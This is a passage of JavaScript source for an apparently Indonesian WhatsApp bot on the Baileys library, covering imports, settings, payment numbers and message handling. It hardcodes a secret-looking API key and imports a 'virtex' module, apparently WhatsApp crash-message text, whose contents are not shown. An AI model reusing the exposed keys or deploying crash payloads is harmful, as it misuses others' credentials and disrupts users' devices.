/*

	あ IZIN SEBELUM RE UPLOAD
	あ YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
	あ FITUR JUALAN TELAH DI HAPUS
	
	あ JASA RUN HEROKU BISA PC wa.me/6281274179050 BIAR BOT NYA GAK TERLALU DELAY
	
*/   
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const crypto = require('crypto')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const hx = require('hxz-api')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const simple = require('./lib/simple.js')
const _sewa = require("./lib/sewa");
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { yta2, ytv2} = require('./lib/y2mate')
const { tiktokDown } = require("./lib/tiktok")
const { webp2mp4File} = require('./lib/webp2mp4')
const { mediafireDl} = require('./lib/mediafire.js')
const { downloadig, igstory } = require("./lib/instadl.js");
const { virtex, vipi } = require('./lib/virtex.js')
const setTtt = require('./lib/tictactoe.js')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const off = require('./lib/afk.js')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
let _off = JSON.parse(fs.readFileSync('./src/afk.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const premium = require("./lib/premiun");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/about_user")
const { list_aov } = require('./shop/aov')
const { list_cod } = require('./shop/cod')
const { list_sausage } = require('./shop/sausage')
const { list_lol } = require('./shop/lol')
const { list_valo } = require('./shop/valo')
const { list_price } = require('./shop/price')
const { allpayment } = require('./shop/allpayment')
const { pc_sewa } = require('./shop/sewa')

const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const register = JSON.parse(fs.readFileSync('./database/user/register.json'))
const  _premium = JSON.parse(fs.readFileSync('./src/premiun.json'));
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync("./src/antivirtex.json"))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const absen = JSON.parse(fs.readFileSync('./src/absen.json'))
const tictactoe = JSON.parse(fs.readFileSync("./src/tictactoe.json"))
const _win = JSON.parse(fs.readFileSync('./src/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./src/tttlose.json'))
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
const banned = JSON.parse(fs.readFileSync('./src/banned.json'))
const _nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const _leveling = JSON.parse(fs.readFileSync('./src/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./src/level.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./src/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./src/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./src/family100.json'))
const tebakanime = JSON.parse(fs.readFileSync('./src/tebakanime.json'))
const  sewa = JSON.parse(fs.readFileSync('./src/sewa.json'));
const event = JSON.parse(fs.readFileSync('./src/event.json'))

//var creatorList = ['Creator WhatsApp Bot', 'Whatsapp Bot Indonesia', 'Creator Bot' , ' Bot WhatsApp']
var creator = setting.ownername
const  { ind, eng, es, ml, ru, pt } = require(`./language`)
lang = ind //language
const Exif = require('./lib/exif')
const exif = new Exif()

//set_sticker_command//
cmd_stc_menu = '7446'
cmd_stc_ping = '7292'
cmd_stc_play_music = '8046'
cmd_stc_group_close = '7850'
cmd_stc_group_open = '7878'
cmd_stc_image_to_sticker = '7688'
cmd_stc_to_image = '6964'
cmd_stc_self = '7038'
cmd_stc_public = '7144'
//set_sticker_command//
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /*
SEBAGIAN LU EDIT DI SETTING.JSON
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
var nomor_ovo = `ke ban bg\ BeneranYah` //gk usah di ubah ya klo gk punya ntr eror
var nomor_dana = `083102176419\ gas bang:v` //gk usah di ubah ya klo gk punya ntr eror
var nomor_gopay = `083102176419\ Isi kan y bang` //gk usah di ubah ya klo gk punya ntr eror
var qr_code_ovo = 'https://telegra.ph/file/a2a93e1c26da975dadd2d.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_dana = 'https://telegra.ph/file/a2a93e1c26da975dadd2d.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_gopay = 'https://telegra.ph/file/a2a93e1c26da975dadd2d.jpg' //gk usah di ubah ya klo gk punya ntr eror

var _minggu = 'Rp 10.000,00' //Masukkan harga sewa sesuai keinginan
var __minggu = 'Rp 15.000,00'
var ___minggu = 'Rp 20.000,00'
var _bulan = 'Rp 22.000,00'
var _permanen = 'Rp 40.000,00'
var __permanen = 'Rp 45.000,00'

zeksApikey = 'HotarouZb' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya
thumbnail = setting.thumb
pp_bot = fs.readFileSync(`image/${thumbnail}`)
fthumb = setting.fakethumb
hit_today = []
blocked = []
ban = []
limitawal = "50"
gcounttprem = "55" 
gcounttuser = "100" 

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix
let menusimple = false
let Mloc = false
let autobio = setting.autobio
let antihidetag = setting.antihidetag

banChats = setting.self_mode
autorespon = false
offline = false
readGc = true 
readPc = false 
antitrol = true 
bugc = true
autovn = true
autoketik = false
autoregister = setting.user_register

img = setting.img
baper = 'Zoraaa '
apiku = 'Wa.me/62831/2176419'
gc_wa_lu = 'https://chat.whatsapp.com/LtrYP0b22L3KgR9bsXcDcF' //klo gk punya gc wa gk usah di ganti 👍
targetpc = setting.ownerNumberr
owner = targetpc
fake = setting.fake
numbernye = '0'
waktu = 'Nothing'
alasan = 'Nothing'
botname = setting.botname
ownername = setting.ownername
peknem = setting.ownername
ownerNumber = setting.ownerNumber
cr = setting.cr
petik = '```'
titik =`...`
enter ='\n'
msgId="B826873620DD5947E683E3ABE663F263"
ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
winawal = 1 
loseawal = 1 
memberwin = 1 
memberlose = 1 

//Credit For 404 SQUAD ( Gk usah di hapus mek)
//Lingz
//Felix
//Lenz
//Arya
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const ikan = JSON.parse(fs.readFileSync('./database/user/ikan.json'))
const planet = JSON.parse(fs.readFileSync('./database/user/planet.json'))
const coal = JSON.parse(fs.readFileSync('./database/user/coal.json'))
const stone = JSON.parse(fs.readFileSync('./database/user/stone.json'))
const ore = JSON.parse(fs.readFileSync('./database/user/ore.json'))
const ingot = JSON.parse(fs.readFileSync('./database/user/ingot.json'))
const kayu = JSON.parse(fs.readFileSync('./database/user/kayu.json'))

//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.ky_ttt
		global.blocked
		m = simple.smsg(alpha, mek)
		let { mentioned } = m
		bail = m.isBaileys
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
               const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
